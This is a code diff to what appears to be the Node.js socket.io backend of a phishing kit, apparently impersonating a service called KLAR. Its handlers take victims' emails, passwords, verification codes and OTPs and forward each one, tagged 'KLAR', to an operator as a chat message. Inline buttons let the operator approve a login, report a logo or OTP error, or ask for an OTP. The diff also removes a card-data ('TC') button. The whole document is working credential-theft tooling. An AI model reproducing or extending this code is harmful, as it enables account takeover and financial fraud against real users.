@@ -31,14 +31,14 @@ io.on('connection', (socket) => {
   socket.on('dataForm', ({ correo, contrasena, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `🔐 Nuevo intento de acceso:\n\n📧 Correo: ${correo}\n🔑 Contraseña: ${contrasena}`;
+    const mensaje = `🔐 Nuevo intento de acceso KLAR:\n\n📧 Correo: ${correo}\n🔑 Contraseña: ${contrasena}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
           [
             { text: '✅ Aceptar', callback_data: `aprobado_${sessionId}` },
             { text: '🚫 Error logo', callback_data: `rechazado_${sessionId}` },
-            { text: '🟨 TC', callback_data: `tc_${sessionId}` }
+           
           ]
         ]
       }
@@ -51,7 +51,7 @@ io.on('connection', (socket) => {
   socket.on('codigoIngresado', ({ codigo, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `🔍 El usuario ingresó el siguiente código:\n\n🧾 Código: ${codigo}`;
+    const mensaje = `🔍 El usuario ingresó el siguiente código KLAR:\n\n🧾 Código: ${codigo}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
@@ -71,14 +71,14 @@ io.on('connection', (socket) => {
   socket.on('otpIngresado', ({ codigo, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `📨 Reintento desde pantalla de error:\n\n🧾 Nuevo código OTP: ${codigo}`;
+    const mensaje = `📨 Reintento desde pantalla de error KLAR:\n\n🧾 Nuevo código OTP: ${codigo}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
           [
             { text: '✅ Finalizar', callback_data: `otpFinalizar_${sessionId}` },
             { text: '❌ Error de OTP', callback_data: `otpError_${sessionId}` },
-            { text: '🟨 TC', callback_data: `tc_${sessionId}` }
+           
           ]
         ]
       }
@@ -91,14 +91,14 @@ io.on('connection', (socket) => {
   socket.on('errorlogoForm', ({ correo, contrasena, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `⚠️ Nuevo intento fallido detectado:\n\n📧 Usuario: ${correo}\n🔑 Clave: ${contrasena}`;
+    const mensaje = `⚠️ Nuevo intento fallido detectado KLAR:\n\n📧 Usuario: ${correo}\n🔑 Clave: ${contrasena}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
           [
             { text: '🔁 OTP', callback_data: `otp_${sessionId}` },
             { text: '🚫 Error logo', callback_data: `errorlogo_${sessionId}` },
-            { text: '🟨 TC', callback_data: `tc_${sessionId}` }
+            
           ]
         ]
       }
